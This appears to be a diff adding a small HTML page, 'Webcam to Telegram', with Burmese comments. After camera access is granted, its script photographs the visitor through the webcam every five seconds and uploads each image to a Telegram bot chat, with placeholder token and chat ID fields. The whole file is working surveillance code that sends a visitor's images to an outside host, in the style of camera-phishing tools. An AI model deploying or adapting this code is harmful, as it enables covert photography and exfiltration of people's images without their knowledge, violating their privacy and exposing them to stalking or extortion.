@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Webcam to Telegram</title>
+</head>
+<body>
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
+
+    // Telegram Setup
+    const BOT_TOKEN = "Your_Bot_Api";   // 👉 မင်း Bot token
+    const CHAT_ID = "Your_Chat_ID";       // 👉 မင်း chat_id
+
+    // Camera Access
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // 5 စက္ကန့်တစ်ကြိမ် capture
+        setInterval(capturePhoto, 5000);
+      })
+      .catch(err => {
+        console.error("Camera Error: ", err);
+      });
+
+    function capturePhoto() {
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        sendToTelegram(blob);
+      }, "image/png");
+    }
+
+    function sendToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("photo", blob, "webcam.png");
+      formData.append("caption", "Captured from webcam");
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+        method: "POST",
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => console.log("Telegram Response:", data))
+      .catch(err => console.error("Telegram Error:", err));
+    }
+  </script>
+</body>
+</html>
